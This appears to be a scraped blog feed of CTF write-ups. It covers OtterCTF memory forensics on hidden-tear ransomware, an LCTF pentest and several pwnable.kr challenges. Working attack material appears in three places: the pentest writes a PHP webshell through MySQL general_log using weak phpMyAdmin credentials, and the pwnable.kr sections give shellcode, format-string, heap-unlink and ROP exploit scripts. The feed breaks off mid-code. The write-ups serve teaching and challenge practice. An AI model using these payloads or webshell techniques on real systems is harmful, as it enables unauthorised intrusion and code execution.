Volatility Framework 2.6************************************************************************Rick And Morty pid:   3820Command line : &quot;C:\Torrents\Rick And Morty season 1 download.exe&quot; Note: use ldrmodules for listing DLLs in Wow64 processesBase                             Size          LoadCount LoadTime                       Path------------------ ------------------ ------------------ ------------------------------ ----0x0000000000400000            0x56000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Torrents\Rick And Morty season 1 download.exe0x00000000776f0000           0x1a9000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll0x0000000075210000            0x3f000                0x3 2018-08-04 19:32:55 UTC+0000   C:\Windows\SYSTEM32\wow64.dll0x00000000751b0000            0x5c000                0x1 2018-08-04 19:32:55 UTC+0000   C:\Windows\SYSTEM32\wow64win.dll0x00000000751a0000             0x8000                0x1 2018-08-04 19:32:55 UTC+0000   C:\Windows\SYSTEM32\wow64cpu.dll➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 dlllist -p 3720Volatility Foundation Volatility Framework 2.6************************************************************************vmware-tray.ex pid:   3720Command line : &quot;C:\Users\Rick\AppData\Local\Temp\RarSFX0\vmware-tray.exe&quot; Note: use ldrmodules for listing DLLs in Wow64 processesBase                             Size          LoadCount LoadTime                       Path------------------ ------------------ ------------------ ------------------------------ ----0x0000000000ec0000            0x6e000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Users\Rick\AppData\Local\Temp\RarSFX0\vmware-tray.exe0x00000000776f0000           0x1a9000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll0x0000000075210000            0x3f000                0x3 2018-08-04 19:33:03 UTC+0000   C:\Windows\SYSTEM32\wow64.dll0x00000000751b0000            0x5c000                0x1 2018-08-04 19:33:03 UTC+0000   C:\Windows\SYSTEM32\wow64win.dll0x00000000751a0000             0x8000                0x1 2018-08-04 19:33:03 UTC+0000   C:\Windows\SYSTEM32\wow64cpu.dll</code></pre><p>temp执行，看起来就有问题了，就他了<br>##flag</p><pre><code class="bash">CTF&#123;vmware-tray.exe&#125;</code></pre><h1 id="8-Path-To-Glory-150"><a href="#8-Path-To-Glory-150" class="headerlink" title="8 - Path To Glory 150"></a>8 - Path To Glory 150</h1><p>##question<br>How did the malware got to rick’s PC? It must be one of rick old illigal habits…<br>format: CTF{…}</p><p>##solve<br>malware，那就是看软件了，filescan一下，发现太多，过滤出rick还是多，以Rick And Morty过滤</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 filescan |grep &quot;Rick And Morty&quot;Volatility Foundation Volatility Framework 2.60x000000007d63dbc0     10      0 R--r-d \Device\HarddiskVolume1\Torrents\Rick And Morty season 1 download.exe0x000000007d8813c0      2      0 RW-rwd \Device\HarddiskVolume1\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrent0x000000007da56240      2      0 RW-rwd \Device\HarddiskVolume1\Torrents\Rick And Morty season 1 download.exe0x000000007dae9350      2      0 RWD--- \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\BitTorrent\Rick And Morty season 1 download.exe.1.torrent0x000000007dcbf6f0      2      0 RW-rwd \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\BitTorrent\Rick And Morty season 1 download.exe.1.torrent0x000000007e710070      8      0 R--rwd \Device\HarddiskVolume1\Torrents\Rick And Morty season 1 download.exe</code></pre><p>把文件dump出来</p><pre><code>➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007dae9350 -D .Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7dae9350   None   \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\BitTorrent\Rick And Morty season 1 download.exe.1.torrent➜  Desktop ➜  Desktop ls1.py                              MS17-010       pwn_exp.py3720.dmp                          OtterCTF.7z    pygmcryptoexecutable.3720.exe               OtterCTF.vmem  strings.txtf                                 out.txt        verinfo.txtfile.None.0xfffffa801b42c9e0.dat  plugin         volatility-2.6.ziph.dd                              pwn            volatility-masterhelp.txt                          pwn_1          welcome.zip➜  Desktop strings file.None.0xfffffa801b42c9e0.datd8:announce44:udp://tracker.openbittorrent.com:80/announce13:announce-listll44:udp://tracker.openbittorrent.com:80/announceel42:udp://tracker.opentrackr.org:1337/announceee10:created by17:BitTorrent/7.10.313:creation datei1533150595e8:encoding5:UTF-84:infod6:lengthi456670e4:name36:Rick And Morty season 1 download.exe12:piece lengthi16384e6:pieces560:\I!PC&lt;^XB.k_Rk0&lt;;O87o!4^&quot;3hq,&amp;iW1|K68:ow~Q~YT$$o9pbwF:ue7:website19:M3an_T0rren7_4_R!cke</code></pre><p>##flag</p><pre><code class="bash">CTF&#123;M3an_T0rren7_4_R!ck&#125;</code></pre><h1 id="9-Path-To-Glory-200"><a href="#9-Path-To-Glory-200" class="headerlink" title="9 - Path To Glory 200"></a>9 - Path To Glory 200</h1><p>##question<br>Continue the search after the the way that malware got in.<br>format: CTF{…}</p><p>##solve<br>先dump出所有的chrome进程</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 memdump -n chrome -D ./f/Volatility Foundation Volatility Framework 2.6************************************************************************Writing chrome.exe [  4076] to 4076.dmp************************************************************************Writing chrome.exe [  4084] to 4084.dmp************************************************************************Writing chrome.exe [   576] to 576.dmp************************************************************************Writing chrome.exe [  1808] to 1808.dmp************************************************************************Writing chrome.exe [  3924] to 3924.dmp************************************************************************Writing chrome.exe [  2748] to 2748.dmp************************************************************************Writing chrome.exe [  3648] to 3648.dmp************************************************************************Writing chrome.exe [  1796] to 1796.dmp</code></pre><p>查找下download.exe.torren</p><pre><code class="bash">➜  Desktop strings ./f/* | grep &quot;download\.exe\.torrent&quot; Rick And Morty season 1 download.exe.torrent==e1f778b7-adf6-48f2-816d-740c99c5f9a4C:\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrentC:\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrent==de371043-340d-42e5-8e16-90e6fbfbc509C:\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrentC:\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrentVisited: Rick@file:///C:/Users/Rick/Downloads/Rick%20And%20Morty%20season%201%20download.exe.torrentRick And Morty season 1 download.exe.torrentRick And Morty season 1 download.exe.torrentRick And Morty season 1 download.exe.torrentRick And Morty season 1 download.exe.torrentContent-Disposition: attachment; filename=&quot;Rick And Morty season 1 download.exe.torrent&quot;attachment; filename=&quot;Rick And Morty season 1 download.exe.torrent&quot;Download complete: Rick And Morty season 1 download.exe.torrent. Press Shift+F6 to cycle to the downloads bar area.</code></pre><pre><code class="bash">➜  Desktop strings ./f/* | grep &quot;download\.exe\.torrent&quot; -A 10 -B 10display:inline;width:56px;height:200px;m&gt;Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@inYear//sec-s.uicdn.com/nav-cdn/home/preloader.gifsimple-icon_toolbar-change-view-horizontal nnx-track-sec-click-communication-inboxic.comnx-track-sec-click-dashboard-hide_smileyableNftd-box stem-north big fullsize js-focusablejs-box-flex need-overlay js-componentoneJhttps://search.mail.com/web [q origin ]Yearntrack-and-trace__delivery-info--has-iconfRick And Morty season 1 download.exe.torrenttbl_1533411035475_7.0.1.40728_2033115181panel-mail-display-table-mail-default35&quot;Cnpanel-mail-display-table-mail-horizontal.jstrc_rbox text-links-a trc-content-sponsored identity_OjpwcmVsb2FkZXIuaHRtbC50d2lnMove the widget to its desired position.3c8=Set-Cookie, no-store, proxy-revalidateHxRKw=Set-Cookie, no-store, proxy-revalidate143/tbl_1533411035475_7.0.9.40728_2033115181&quot;mail.com Update&quot; &lt;service@corp.mail.com&gt;e</code></pre><p>##flag</p><pre><code class="bash">CTF&#123;Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@in&#125;</code></pre><h1 id="10-Bit-4-Bit-100"><a href="#10-Bit-4-Bit-100" class="headerlink" title="10 - Bit 4 Bit 100"></a>10 - Bit 4 Bit 100</h1><p>##question<br>We’ve found out that the malware is a ransomware. Find the attacker’s bitcoin address.<br>format: CTF{…}</p><p>##solve<br>dump出之前的exe</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 procdump -p 3720 -D ./Volatility Foundation Volatility Framework 2.6Process(V)         ImageBase          Name                 Result------------------ ------------------ -------------------- ------0xfffffa801a4c5b30 0x0000000000ec0000 vmware-tray.ex       OK: executable.3720.exe</code></pre><p>然后ida拖进去逆下就ok</p><pre><code class="bash">    text &quot;UTF-16LE&quot;, &quot;Click next for more information and payment on how &quot;    text &quot;UTF-16LE&quot;, &quot;to get your files back.&quot;,0aButton1:                               // DATA XREF: hidden_tear.Form1__InitializeComponent+1C6↑o                                        // hidden_tear.Form2__InitializeComponent+122↑o ...    text &quot;UTF-16LE&quot;, &quot;button1&quot;,0aNext:                                  // DATA XREF: hidden_tear.Form1__InitializeComponent+1FC↑o    text &quot;UTF-16LE&quot;, &quot;Next&quot;,0aPicturebox1:                           // DATA XREF: hidden_tear.Form1__InitializeComponent+25E↑o                                        // hidden_tear.Form3__InitializeComponent+72↑o    text &quot;UTF-16LE&quot;, &quot;pictureBox1&quot;,0aThisIcon:                              // DATA XREF: hidden_tear.Form1__InitializeComponent+351↑o    text &quot;UTF-16LE&quot;, &quot;$this.Icon&quot;,0aForm1:                                 // DATA XREF: hidden_tear.Form1__InitializeComponent+37C↑o    text &quot;UTF-16LE&quot;, &quot;Form1&quot;,0aTextbox1:                              // DATA XREF: hidden_tear.Form2__InitializeComponent+99↑o                                        // hidden_tear.Form3__InitializeComponent+120↑o    text &quot;UTF-16LE&quot;, &quot;textBox1&quot;,0aTextbox1Text:                          // DATA XREF: hidden_tear.Form2__InitializeComponent+E0↑o    text &quot;UTF-16LE&quot;, &quot;textBox1.Text&quot;,0aNext_0:                                // DATA XREF: hidden_tear.Form2__InitializeComponent+158↑o    text &quot;UTF-16LE&quot;, &quot;Next,&quot;,0aForm2:                                 // DATA XREF: hidden_tear.Form2__InitializeComponent+201↑o    text &quot;UTF-16LE&quot;, &quot;Form2&quot;,0aCheckingPaymen:                        // DATA XREF: hidden_tear.Form3__button1_Click+1↑o    text &quot;UTF-16LE&quot;, &quot;Checking Payment.................Please Wait&quot;,0aPleaseWait:                            // DATA XREF: hidden_tear.Form3__button1_Click+6↑o    text &quot;UTF-16LE&quot;, &quot;Please wait&quot;,0aYourPaymentHas:                        // DATA XREF: hidden_tear.Form3__button1_Click+11↑o    text &quot;UTF-16LE&quot;, &quot;Your Payment has failed, The funs have been sent ba&quot;    text &quot;UTF-16LE&quot;, &quot;ck to your wallet. Please send it again&quot;,0aError:                                 // DATA XREF: hidden_tear.Form3__button1_Click+16↑o    text &quot;UTF-16LE&quot;, &quot;Error&quot;,0a1mmpemebjkqxg8:                        // DATA XREF: hidden_tear.Form3__InitializeComponent+163↑o    text &quot;UTF-16LE&quot;, &quot;1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M&quot;,0aSend016ToTheAd:                        // DATA XREF: hidden_tear.Form3__InitializeComponent+219↑o    text &quot;UTF-16LE&quot;, &quot;Send 0.16 to the address below.&quot;,0aIPaidNowGiveMe:                        // DATA XREF: hidden_tear.Form3__InitializeComponent+2B5↑o    text &quot;UTF-16LE&quot;, &quot;I paid, Now give me back my files.&quot;,0aForm3:                                 // DATA XREF: hidden_tear.Form3__InitializeComponent+376↑o    text &quot;UTF-16LE&quot;, &quot;Form3&quot;,0aHiddenTearProp:                        // DATA XREF: hidden_tear.Properties.Resources__get_ResourceManager+E↑o    text &quot;UTF-16LE&quot;, &quot;hidden_tear.Properties.Resources&quot;,0</code></pre><p>##flag</p><pre><code class="bash">CTF&#123;1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M&#125;</code></pre><h1 id="11-Graphic’s-For-The-Weak-150"><a href="#11-Graphic’s-For-The-Weak-150" class="headerlink" title="11 - Graphic’s For The Weak 150"></a>11 - Graphic’s For The Weak 150</h1><p>##question<br>There’s something fishy in the malware’s graphics.<br>format: CTF{…}</p><p>##solve<br>要提取图片，我太菜ida搞不动了，只能上dnspy了(ps:还是太菜了没想到，为什么不上一题就用)<br>拖开就能看到<br>##flag</p><pre><code class="bash">CTF&#123;S0_Just_M0v3_Socy&#125;</code></pre><h1 id="12-Recovery-300"><a href="#12-Recovery-300" class="headerlink" title="12 - Recovery 300"></a>12 - Recovery 300</h1><p>##question<br>Rick got to have his files recovered! What is the random password used to encrypt the files?</p><p>format: CTF{…}</p><p>##solve<br>form1里面有个sendpassword函数，不过没发送只是用computerName+username</p><pre><code class="bash">// hidden_tear.Form1// Token: 0x06000006 RID: 6 RVA: 0x000022E8 File Offset: 0x000004E8public void SendPassword(string password)&#123;  string text = string.Concat(new string[]  &#123;    this.computerName,    &quot;-&quot;,    this.userName,    &quot; &quot;,    password  &#125;);&#125;</code></pre><p>strings一下吧</p><pre><code class="bash">➜  Desktop strings -el OtterCTF.vmem | grep WIN-LO6FAF3DTFE-Rick  WIN-LO6FAF3DTFE-Rick aDOBofVYUNVnmp7</code></pre><p>##flag</p><pre><code class="bash">CTF&#123;aDOBofVYUNVnmp7&#125;</code></pre><h1 id="13-Closure-400"><a href="#13-Closure-400" class="headerlink" title="13 - Closure 400"></a>13 - Closure 400</h1><p>##question<br>Now that you extracted the password from the memory, could you decrypt rick’s files?</p><p>##solve<br>先查看下exe的pdb信息</p><pre><code class="bash">➜  Desktop strings executable.3720.exe|grep pdbC:\Users\Tyler\Desktop\hidden-tear-master\hidden-tear\hidden-tear\obj\Debug\VapeHacksLoader.pdb</code></pre><p>之前filescan时记得桌面有个flag.txt</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 filescan |grep Desktop   Volatility Foundation Volatility Framework 2.60x000000007d660500      2      0 -W-r-- \Device\HarddiskVolume1\Users\Rick\Desktop\READ_IT.txt0x000000007d74c2d0      2      1 R--rwd \Device\HarddiskVolume1\Users\Rick\Desktop0x000000007d7f98c0      2      1 R--rwd \Device\HarddiskVolume1\Users\Rick\Desktop0x000000007d864250     16      0 R--rwd \Device\HarddiskVolume1\Users\Public\Desktop\desktop.ini0x000000007d8a9070     16      0 R--rwd \Device\HarddiskVolume1\Users\Rick\Desktop\desktop.ini0x000000007d8ac800      2      1 R--rwd \Device\HarddiskVolume1\Users\Public\Desktop0x000000007d8ac950      2      1 R--rwd \Device\HarddiskVolume1\Users\Public\Desktop0x000000007e410890     16      0 R--r-- \Device\HarddiskVolume1\Users\Rick\Desktop\Flag.txt0x000000007e5c52d0      3      0 R--rwd \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\Microsoft\Windows\SendTo\Desktop.ini0x000000007e77fb60      1      1 R--rw- \Device\HarddiskVolume1\Users\Rick\Desktop</code></pre><p>先把文件dump出来</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 -D ./f/Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7e410890   None   \Device\HarddiskVolume1\Users\Rick\Desktop\Flag.txt➜  Desktop file ./f/file.None.0xfffffa801b0532e0.dat ./f/file.None.0xfffffa801b0532e0.dat: data</code></pre><p>移除文件后面的00 字节用hidden-tear-decrypto工具密码<code>aDOBofVYUNVnmp7</code>解开即得到flag<br>##flag</p><pre><code class="bash">CTF&#123;Im_Th@_B3S7_RicK_0f_Th3m_4ll&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lctf2018-god of domain pentest</title>
      <link href="/2018/11/20/lctf2018-god-of-domain-pentest/"/>
      <url>/2018/11/20/lctf2018-god-of-domain-pentest/</url>
      
        <content type="html"><![CDATA[<h1 id="question"><a href="#question" class="headerlink" title="question"></a>question</h1><pre><code class="bash">题目描述：windows域环境权限不好配，还请各位师傅高抬贵手，不要搅屎 c段只用到了0-20，不需要扫21-255，端口也只开放了常用端口。 web.lctf.com中有个域用户是web.lctf.com\buguake,密码是172.21.0.8的本地管理员密码 188.131.161.90</code></pre><span id="more"></span><p>nmap scan in first.Recent web pentest like to give socks5</p><pre><code class="bash">➜  ubuntu nmap -p 1000-1100 188.131.161.90Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-20 00:50 CSTNmap scan report for 188.131.161.90Host is up (0.048s latency).Not shown: 97 closed portsPORT     STATE SERVICE1083/tcp open  ansoft-lm-11084/tcp open  ansoft-lm-21088/tcp open  cplscrambler-al1089/tcp open  ff-annuncNmap done: 1 IP address (1 host up) scanned in 14.63 seconds</code></pre><p>go with proxy！ </p><pre><code class="bash">export all_proxy=socks5://188.131.161.90:1083</code></pre><p>Visit <a href="http://172.21.0.1/">http://172.21.0.1</a></p><pre><code class="html">Hello World</code></pre><p>try for <a href="http://172.21.0.1/phpinfo.php">http://172.21.0.1/phpinfo.php</a><br><img src="/img/2018/11/20/172.21.0.8-phpinfo.php.png" alt="phpinfo"></p><p>found it with phpstudy,try login phpmyadmin with weak password</p><pre><code class="bash">root root phpmyadminroot root</code></pre><p>use general_log </p><pre><code class="sql">select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;INTO OUTFILE &#39;c:/phpStudy/PHPTutorial/WWW/cmd.php&#39;</code></pre><p>result</p><pre><code class="c">#1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code></pre><p>change way</p><pre><code class="sql">set global general_log=&#39;on&#39;;SET global general_log_file=&#39;C:/phpStudy/PHPTutorial/WWW/xyzz1.php&#39;;SELECT &#39;&lt;?php assert($_GET[&quot;cmd&quot;]);?&gt;&#39;;</code></pre><p>get webshell~~~</p><p>visit it</p><pre><code class="url">http://172.21.0.8/xyzz1.php?cmd=system(%22whoami%22)</code></pre><pre><code class="html">C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe, Version: 5.5.53 (MySQL Community Server (GPL)). started with: TCP Port: 3306, Named Pipe: MySQL Time Id Command Argument 364 Init DB    mysql 364 Query    SELECT &#39;pupiles-pc\administrator &#39; 364 Query    SHOW TABLE STATUS FROM `mysql` LIKE &#39;general\_log%&#39; 364 Query SELECT COUNT(*) FROM `mysql`.`general_log` 364 Query    SHOW CREATE TABLE `mysql`.`general_log` 364 Quit</code></pre><p>emmm,the website is closed.give up!<br>from Nu1L’s wp,next with ms17-010 ,ms14-068—-<br>Nu1L’s wp:[wp]<a href="https://xz.aliyun.com/t/3341#toc-18">https://xz.aliyun.com/t/3341#toc-18</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-kr-4</title>
      <link href="/2018/10/30/pwnable-kr-4/"/>
      <url>/2018/10/30/pwnable-kr-4/</url>
      
        <content type="html"><![CDATA[<h1 id="1-tiny-easy"><a href="#1-tiny-easy" class="headerlink" title="1.tiny_easy"></a>1.tiny_easy</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><pre><code class="python">from pwn import *shellcode  = &quot;\xeb\x11\x5e\x31\xc9\xb1\x32\x80&quot;shellcode += &quot;\x6c\x0e\xff\x01\x80\xe9\x01\x75&quot;shellcode += &quot;\xf6\xeb\x05\xe8\xea\xff\xff\xff&quot;shellcode += &quot;\x32\xc1\x51\x69\x30\x30\x74\x69&quot;shellcode += &quot;\x69\x30\x63\x6a\x6f\x8a\xe4\x51&quot;shellcode += &quot;\x54\x8a\xe2\x9a\xb1\x0c\xce\x81&quot;payload = &quot;\x90&quot; * 8000 + shellcode#p64(0xff9c3844)env = &#123;&#125;for i in range(1,0x100):    env[str(i)] = payloadwhile True:    io = process([p32(0xff9c3844)],executable=&quot;./tiny_easy&quot;, env=env)    io.interactive()</code></pre><span id="more"></span><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">What a tiny task :) good job!</code></pre><h1 id="2-fsb"><a href="#2-fsb" class="headerlink" title="2.fsb"></a>2.fsb</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;alloca.h&gt;#include &lt;fcntl.h&gt;unsigned long long key;char buf[100];char buf2[100];int fsb(char** argv, char** envp)&#123;    char* args[]=&#123;&quot;/bin/sh&quot;, 0&#125;;    int i;    char*** pargv = &amp;argv;    char*** penvp = &amp;envp;        char** arg;        char* c;        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c=&#39;\0&#39;;        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c=&#39;\0&#39;;    *pargv=0;    *penvp=0;    for(i=0; i&lt;4; i++)&#123;        printf(&quot;Give me some format strings(%d)\n&quot;, i+1);        read(0, buf, 100);        printf(buf);    &#125;    printf(&quot;Wait a sec...\n&quot;);        sleep(3);        printf(&quot;key : \n&quot;);        read(0, buf2, 100);        unsigned long long pw = strtoull(buf2, 0, 10);        if(pw == key)&#123;                printf(&quot;Congratz!\n&quot;);                execve(args[0], args, 0);                return 0;        &#125;        printf(&quot;Incorrect key \n&quot;);    return 0;&#125;int main(int argc, char* argv[], char** envp)&#123;    int fd = open(&quot;/dev/urandom&quot;, O_RDONLY);    if( fd==-1 || read(fd, &amp;key, 8) != 8 )&#123;        printf(&quot;Error, tell admin\n&quot;);        return 0;    &#125;    close(fd);    alloca(0x12345 &amp; key);    fsb(argv, envp); // exploit this format string bug!    return 0;&#125;</code></pre><p>##solve</p><pre><code class="bash">fsb@ubuntu:~$ ./fsb &gt; /dev/null%134520836c%14$n%134514347c%20$ncat flag&gt;&amp;0</code></pre><p>change got.plt</p><pre><code class="bash">gdb-peda$ gotGOT protection: Partial RELRO | GOT functions: 10[0x804a000] read@GLIBC_2.0 -&gt; 0xf7610b00 (read) ◂— cmp    dword ptr gs:[0xc], 0[0x804a004] printf@GLIBC_2.0 -&gt; 0x80486ab (fsb+375) ◂— mov    eax, dword ptr [ebp - 0x24][0x804a008] sleep@GLIBC_2.0 -&gt; 0x8048406 (sleep@plt+6) ◂— push   0x10[0x804a00c] puts@GLIBC_2.0 -&gt; 0x8048416 (puts@plt+6) ◂— push   0x18[0x804a010] __gmon_start__ -&gt; 0x8048426 (__gmon_start__@plt+6) ◂— push   0x20 /* &#39;h &#39; */[0x804a014] open@GLIBC_2.0 -&gt; 0xf76106f0 (open) ◂— cmp    dword ptr gs:[0xc], 0[0x804a018] __libc_start_main@GLIBC_2.0 -&gt; 0xf7553540 (__libc_start_main) ◂— call   0xf765ab59[0x804a01c] execve@GLIBC_2.0 -&gt; 0x8048456 (execve@plt+6) ◂— push   0x38 /* &#39;h8&#39; */[0x804a020] strtoull@GLIBC_2.0 -&gt; 0x8048466 (strtoull@plt+6) ◂— push   0x40 /* &#39;h@&#39; */[0x804a024] close@GLIBC_2.0 -&gt; 0xf7611290 (close) ◂— cmp    dword ptr gs:[0xc], 0</code></pre><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">Have you ever saw an example of utilizing [n] format character?? :(</code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr_3</title>
      <link href="/2018/08/23/pwnable-kr-3/"/>
      <url>/2018/08/23/pwnable-kr-3/</url>
      
        <content type="html"><![CDATA[<h1 id="16-unlink"><a href="#16-unlink" class="headerlink" title="16.unlink"></a>16.unlink</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><span id="more"></span><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123;  struct tagOBJ* fd;  struct tagOBJ* bk;  char buf[8];&#125;OBJ;void shell()&#123;  system(&quot;/bin/sh&quot;);&#125;void unlink(OBJ* P)&#123;  OBJ* BK;  OBJ* FD;  BK=P-&gt;bk;  FD=P-&gt;fd;  FD-&gt;bk=BK;  BK-&gt;fd=FD;&#125;int main(int argc, char* argv[])&#123;  malloc(1024);  OBJ* A = (OBJ*)malloc(sizeof(OBJ));  OBJ* B = (OBJ*)malloc(sizeof(OBJ));  OBJ* C = (OBJ*)malloc(sizeof(OBJ));  // double linked list: A &lt;-&gt; B &lt;-&gt; C  A-&gt;fd = B;  B-&gt;bk = A;  B-&gt;fd = C;  C-&gt;bk = B;  printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);  printf(&quot;here is heap address leak: %p\n&quot;, A);  printf(&quot;now that you have leaks, get shell!\n&quot;);  // heap overflow!  gets(A-&gt;buf);  // exploit this unlink!  unlink(B);  return 0;&#125;</code></pre><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><pre><code class="python">from pwn import *p=process(&#39;./unlink&#39;)p.recvuntil(&#39;here is stack address leak: &#39;)stack_addr = int(p.recvline()[:-1],16)p.recvuntil(&#39;here is heap address leak: &#39;)heap_addr = int(p.recvline()[:-1],16)shell_addr = 0x80484ebpayload=p32(shell_addr)+&#39;A&#39;*12+p32(stack_addr+12)+p32(heap_addr+12)p.sendline(payload)p.interactive()</code></pre><h1 id="17-blukat"><a href="#17-blukat" class="headerlink" title="17.blukat"></a>17.blukat</h1><h2 id="question-1"><a href="#question-1" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;char flag[100];char password[100];char* key = &quot;3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+&quot;;void calc_flag(char* s)&#123;  int i;  for(i=0; i&lt;strlen(s); i++)&#123;    flag[i] = s[i] ^ key[i];  &#125;  printf(&quot;%s\n&quot;, flag);&#125;int main()&#123;  FILE* fp = fopen(&quot;/home/blukat/password&quot;, &quot;r&quot;);  fgets(password, 100, fp);  char buf[100];  printf(&quot;guess the password!\n&quot;);  fgets(buf, 128, stdin);  if(!strcmp(password, buf))&#123;    printf(&quot;congrats! here is your flag: &quot;);    calc_flag(password);  &#125;  else&#123;    printf(&quot;wrong guess!\n&quot;);    exit(0);  &#125;  return 0;&#125;</code></pre><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">blukat@ubuntu:~$ iduid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)blukat@ubuntu:~$ cat password |./blukatguess the password!congrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!</code></pre><h1 id="18-horcruxes"><a href="#18-horcruxes" class="headerlink" title="18.horcruxes"></a>18.horcruxes</h1><h2 id="question-2"><a href="#question-2" class="headerlink" title="question"></a>question</h2><pre><code class="bash">connect to port 9032 (nc 0 9032). the &#39;horcruxes&#39; binary will be executed under horcruxes_pwn privilege.rop it to read the flag.</code></pre><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">from pwn import *context.log_level=&#39;debug&#39;s = ssh(&quot;horcruxes&quot;, &quot;pwnable.kr&quot;, port=2222, password=&quot;guest&quot;)r = s.remote(&quot;localhost&quot;, 9032)e = ELF(&#39;./horcruxes&#39;)t=[]for i in range(ord(&#39;A&#39;),ord(&#39;G&#39;)+1):  t.append(e.symbols[chr(i)])addr_ropme=0x0809FFFCpayload=&#39;a&#39;*120for i in t:  payload+=p32(i)payload+=p32(addr_ropme)print(&#39;123&#39;,payload)r.recvuntil(&#39;Select Menu:&#39;)r.sendline(&#39;0&#39;)r.sendline(payload)sum=0for i in range(7):  r.recvuntil(&#39;(EXP +&#39;)  sum += int(r.recvuntil(&#39;)&#39;)[:-1])r.recvuntil(&quot;Menu:&quot;)r.sendline(&quot;0&quot;)r.recvuntil(&quot;earned? : &quot;)r.sendline(str(sum)) r.interactive()</code></pre><h1 id="19-blackjack"><a href="#19-blackjack" class="headerlink" title="19.blackjack"></a>19.blackjack</h1><h2 id="question-3"><a href="#question-3" class="headerlink" title="question"></a>question</h2><pre><code class="c">if (bet &gt; cash) //If player tries to bet more money than player has &#123;        printf(&quot;\nYou cannot bet more money than you have.&quot;);        printf(&quot;\nEnter Bet: &quot;);        scanf(&quot;%d&quot;, &amp;bet);        return bet; &#125;</code></pre><h2 id="solve-3"><a href="#solve-3" class="headerlink" title="solve"></a>solve</h2><p>int overflow</p><pre><code class="bash">Enter Bet: $1000You cannot bet more money than you have.Enter Bet: 4293967296</code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">YaY_I_AM_A_MILLIONARE_LOL</code></pre><h1 id="20-lotto"><a href="#20-lotto" class="headerlink" title="20.lotto"></a>20.lotto</h1><h2 id="question-4"><a href="#question-4" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play()&#123;  int i;  printf(&quot;Submit your 6 lotto bytes : &quot;);  fflush(stdout);  int r;  r = read(0, submit, 6);  printf(&quot;Lotto Start!\n&quot;);  //sleep(1);  // generate lotto numbers  int fd = open(&quot;/dev/urandom&quot;, O_RDONLY);  if(fd==-1)&#123;    printf(&quot;error. tell admin\n&quot;);    exit(-1);  &#125;  unsigned char lotto[6];  if(read(fd, lotto, 6) != 6)&#123;    printf(&quot;error2. tell admin\n&quot;);    exit(-1);  &#125;  for(i=0; 